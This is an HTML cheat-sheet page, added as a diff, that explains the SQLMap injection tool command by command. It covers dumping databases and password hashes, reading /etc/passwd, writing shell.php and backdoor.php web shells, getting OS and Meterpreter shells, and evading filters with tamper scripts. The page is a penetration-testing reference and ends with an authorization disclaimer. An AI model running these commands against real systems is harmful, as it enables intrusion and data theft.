@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap Guide - Cybersecurity Cheat Sheet</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../guide-styles.css">
+</head>
+<body>
+    <div class="guide-container">
+        <header class="guide-header">
+            <h1>SQLMap: Automatic SQL Injection and Database Takeover Tool</h1>
+            <p>Master SQL Injection Detection and Exploitation</p>
+            <a href="../index.html" class="back-link">&larr; Back to Cheat Sheet</a>
+        </header>
+
+        <main class="guide-content">
+            <section id="introduction">
+                <h2>What is SQLMap?</h2>
+                <p>SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</p>
+            </section>
+
+            <section id="installation">
+                <h2>Installation & Setup</h2>
+                <div class="command-block">
+                    <h3>Linux Installation</h3>
+                    <pre><code># Ubuntu/Debian
+sudo apt update && sudo apt install sqlmap
+
+# Kali Linux (pre-installed)
+sqlmap --help
+
+# From GitHub (latest version)
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+python sqlmap.py --help</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Windows Installation</h3>
+                    <pre><code># Download from https://github.com/sqlmapproject/sqlmap
+# Extract and run with Python
+python sqlmap.py --help
+
+# Or use pre-compiled executable
+sqlmap.exe --help</code></pre>
+                </div>
+            </section>
+
+            <section id="basic-usage">
+                <h2>Basic Usage & Syntax</h2>
+                <div class="command-block">
+                    <h3>Command Structure</h3>
+                    <pre><code># Basic syntax
+sqlmap -u "URL" [options]
+
+# Simple GET parameter test
+sqlmap -u "http://example.com/page.php?id=1"
+
+# POST data test
+sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"
+
+# Test specific parameter
+sqlmap -u "http://example.com/page.php?id=1&name=test" -p id</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Request Options</h3>
+                    <pre><code># Custom headers
+sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1"
+
+# User agent
+sqlmap -u "URL" --user-agent="Mozilla/5.0..."
+
+# Cookies
+sqlmap -u "URL" --cookie="PHPSESSID=abc123; user=admin"
+
+# HTTP method
+sqlmap -u "URL" --method=PUT
+
+# Proxy
+sqlmap -u "URL" --proxy="http://127.0.0.1:8080"</code></pre>
+                </div>
+            </section>
+
+            <section id="detection-techniques">
+                <h2>Detection Techniques</h2>
+                <div class="command-block">
+                    <h3>Detection Levels</h3>
+                    <pre><code># Level 1 (default) - Basic tests
+sqlmap -u "URL" --level=1
+
+# Level 2 - More HTTP headers
+sqlmap -u "URL" --level=2
+
+# Level 3 - User-Agent header
+sqlmap -u "URL" --level=3
+
+# Level 4 - Referer header
+sqlmap -u "URL" --level=4
+
+# Level 5 - Host header (maximum)
+sqlmap -u "URL" --level=5</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Risk Levels</h3>
+                    <pre><code># Risk 1 (default) - Safe tests
+sqlmap -u "URL" --risk=1
+
+# Risk 2 - Heavy query time-based tests
+sqlmap -u "URL" --risk=2
+
+# Risk 3 - OR-based tests (may modify data)
+sqlmap -u "URL" --risk=3</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Specific Techniques</h3>
+                    <pre><code># Boolean-based blind
+sqlmap -u "URL" --technique=B
+
+# Error-based
+sqlmap -u "URL" --technique=E
+
+# Union query-based
+sqlmap -u "URL" --technique=U
+
+# Stacked queries
+sqlmap -u "URL" --technique=S
+
+# Time-based blind
+sqlmap -u "URL" --technique=T
+
+# Combine techniques
+sqlmap -u "URL" --technique=BEUST</code></pre>
+                </div>
+            </section>
+
+            <section id="enumeration">
+                <h2>Database Enumeration</h2>
+                <div class="command-block">
+                    <h3>Basic Information</h3>
+                    <pre><code># Database banner
+sqlmap -u "URL" --banner
+
+# Current user
+sqlmap -u "URL" --current-user
+
+# Current database
+sqlmap -u "URL" --current-db
+
+# Check if user is DBA
+sqlmap -u "URL" --is-dba
+
+# List users
+sqlmap -u "URL" --users
+
+# List password hashes
+sqlmap -u "URL" --passwords</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Database Structure</h3>
+                    <pre><code># List databases
+sqlmap -u "URL" --dbs
+
+# List tables in database
+sqlmap -u "URL" -D database_name --tables
+
+# List columns in table
+sqlmap -u "URL" -D database_name -T table_name --columns
+
+# Get table schema
+sqlmap -u "URL" -D database_name -T table_name --schema</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Data Extraction</h3>
+                    <pre><code># Dump entire database
+sqlmap -u "URL" -D database_name --dump
+
+# Dump specific table
+sqlmap -u "URL" -D database_name -T table_name --dump
+
+# Dump specific columns
+sqlmap -u "URL" -D database_name -T table_name -C "username,password" --dump
+
+# Dump with conditions
+sqlmap -u "URL" -D database_name -T users --dump --where="id>1"</code></pre>
+                </div>
+            </section>
+
+            <section id="advanced-exploitation">
+                <h2>Advanced Exploitation</h2>
+                <div class="command-block">
+                    <h3>File System Access</h3>
+                    <pre><code># Read file from server
+sqlmap -u "URL" --file-read="/etc/passwd"
+
+# Write file to server
+sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Upload and execute file
+sqlmap -u "URL" --file-write="backdoor.php" --file-dest="/tmp/backdoor.php"</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Operating System Access</h3>
+                    <pre><code># Execute OS commands
+sqlmap -u "URL" --os-cmd="whoami"
+
+# Interactive OS shell
+sqlmap -u "URL" --os-shell
+
+# SQL shell
+sqlmap -u "URL" --sql-shell
+
+# Meterpreter shell
+sqlmap -u "URL" --os-pwn</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Registry Access (Windows)</h3>
+                    <pre><code># Read registry key
+sqlmap -u "URL" --reg-read --reg-key="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" --reg-value="ProductName"
+
+# Add registry key
+sqlmap -u "URL" --reg-add --reg-key="HKLM\SOFTWARE\Test" --reg-value="TestValue" --reg-data="TestData" --reg-type="REG_SZ"
+
+# Delete registry key
+sqlmap -u "URL" --reg-del --reg-key="HKLM\SOFTWARE\Test" --reg-value="TestValue"</code></pre>
+                </div>
+            </section>
+
+            <section id="evasion-techniques">
+                <h2>Evasion Techniques</h2>
+                <div class="command-block">
+                    <h3>Tamper Scripts</h3>
+                    <pre><code># List available tamper scripts
+sqlmap --list-tampers
+
+# Use single tamper script
+sqlmap -u "URL" --tamper=space2comment
+
+# Use multiple tamper scripts
+sqlmap -u "URL" --tamper=space2comment,charencode
+
+# Common tamper scripts:
+# space2comment - Replace spaces with comments
+# charencode - URL encode characters
+# base64encode - Base64 encode payload
+# between - Replace BETWEEN with NOT BETWEEN</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Request Delays</h3>
+                    <pre><code># Add delay between requests
+sqlmap -u "URL" --delay=2
+
+# Random delay (0.5-1.5 seconds)
+sqlmap -u "URL" --delay=1 --randomize
+
+# Timeout for responses
+sqlmap -u "URL" --timeout=30</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Other Evasion Options</h3>
+                    <pre><code># Random User-Agent
+sqlmap -u "URL" --random-agent
+
+# Custom payload boundaries
+sqlmap -u "URL" --prefix="'" --suffix="-- -"
+
+# Skip URL encoding
+sqlmap -u "URL" --skip-urlencode
+
+# Force SSL/TLS
+sqlmap -u "URL" --force-ssl</code></pre>
+                </div>
+            </section>
+
+            <section id="session-management">
+                <h2>Session Management</h2>
+                <div class="command-block">
+                    <h3>Session Files</h3>
+                    <pre><code># Save session to file
+sqlmap -u "URL" -s session.sqlite
+
+# Load session from file
+sqlmap -u "URL" -s session.sqlite --flush-session
+
+# Session directory
+sqlmap -u "URL" --session-file=/tmp/sqlmap_session</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Output Options</h3>
+                    <pre><code># Save output to file
+sqlmap -u "URL" --output-dir=/tmp/sqlmap_output
+
+# Verbose output
+sqlmap -u "URL" -v 3
+
+# Traffic log
+sqlmap -u "URL" -t traffic.log
+
+# Batch mode (non-interactive)
+sqlmap -u "URL" --batch</code></pre>
+                </div>
+            </section>
+
+            <section id="burp-integration">
+                <h2>Burp Suite Integration</h2>
+                <div class="command-block">
+                    <h3>Using Burp Request Files</h3>
+                    <pre><code># Save request from Burp to file
+# Right-click request → Save item
+
+# Use saved request file
+sqlmap -r request.txt
+
+# Test specific parameter from request
+sqlmap -r request.txt -p username
+
+# Skip parameter
+sqlmap -r request.txt --skip=csrf_token</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Proxy Integration</h3>
+                    <pre><code># Route through Burp proxy
+sqlmap -u "URL" --proxy="http://127.0.0.1:8080"
+
+# Ignore proxy for specific hosts
+sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --ignore-proxy</code></pre>
+                </div>
+            </section>
+
+            <section id="automation">
+                <h2>Automation & Scripting</h2>
+                <div class="command-block">
+                    <h3>Batch Processing</h3>
+                    <pre><code># Process multiple URLs from file
+sqlmap -m urls.txt --batch
+
+# Crawl website for forms
+sqlmap -u "http://example.com" --crawl=2 --forms
+
+# Google dorking integration
+sqlmap -g "inurl:php?id=" --batch</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Configuration Files</h3>
+                    <pre><code># Use configuration file
+sqlmap -c sqlmap.conf
+
+# Example sqlmap.conf:
+[Target]
+url = http://example.com/page.php?id=1
+
+[Request]
+method = GET
+cookie = PHPSESSID=abc123
+
+[Enumeration]
+current-user = True
+current-db = True</code></pre>
+                </div>
+            </section>
+
+            <section id="database-specific">
+                <h2>Database-Specific Features</h2>
+                <div class="command-block">
+                    <h3>MySQL</h3>
+                    <pre><code># MySQL specific enumeration
+sqlmap -u "URL" --dbms=mysql --privileges
+sqlmap -u "URL" --dbms=mysql --file-read="/etc/passwd"
+
+# UDF injection
+sqlmap -u "URL" --dbms=mysql --udf-inject</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>PostgreSQL</h3>
+                    <pre><code># PostgreSQL specific
+sqlmap -u "URL" --dbms=postgresql --file-read="/etc/passwd"
+
+# Large object support
+sqlmap -u "URL" --dbms=postgresql --file-write="shell.php" --file-dest="shell.php"</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Microsoft SQL Server</h3>
+                    <pre><code># MSSQL specific
+sqlmap -u "URL" --dbms=mssql --privileges
+
+# xp_cmdshell execution
+sqlmap -u "URL" --dbms=mssql --os-shell</code></pre>
+                </div>
+            </section>
+
+            <section id="tips">
+                <h2>Pro Tips & Best Practices</h2>
+                <ul>
+                    <li><strong>Start with low risk/level:</strong> Avoid detection and false positives</li>
+                    <li><strong>Use specific parameters:</strong> Target known vulnerable parameters with -p</li>
+                    <li><strong>Save sessions:</strong> Resume interrupted scans with session files</li>
+                    <li><strong>Use tamper scripts:</strong> Bypass WAFs and filters</li>
+                    <li><strong>Batch mode for automation:</strong> Use --batch for non-interactive scans</li>
+                    <li><strong>Combine with other tools:</strong> Use Burp Suite for request capture</li>
+                    <li><strong>Test incrementally:</strong> Start with detection, then enumerate, then exploit</li>
+                    <li><strong>Document findings:</strong> Save output and traffic logs</li>
+                </ul>
+            </section>
+
+            <section id="common-scenarios">
+                <h2>Common Testing Scenarios</h2>
+                <div class="command-block">
+                    <h3>Login Form Testing</h3>
+                    <pre><code># Test login form
+sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass" --level=3 --risk=2
+
+# Test with cookies
+sqlmap -u "http://example.com/profile.php" --cookie="PHPSESSID=abc123" --level=2</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Search Function Testing</h3>
+                    <pre><code># Test search parameter
+sqlmap -u "http://example.com/search.php?q=test" -p q --technique=BEUST
+
+# Test with custom injection point
+sqlmap -u "http://example.com/search.php" --data="query=test*" --level=3</code></pre>
+                </div>
+            </section>
+
+            <section id="legal-disclaimer">
+                <h2>Legal Disclaimer</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> SQLMap should only be used for:</p>
+                    <ul>
+                        <li>Testing your own applications and databases</li>
+                        <li>Authorized penetration testing with written permission</li>
+                        <li>Educational purposes in controlled environments</li>
+                        <li>Security research on isolated test systems</li>
+                    </ul>
+                    <p>Unauthorized testing of applications you don't own is illegal and unethical. SQL injection attacks can cause data loss, system compromise, and legal consequences. Always obtain proper authorization before testing.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
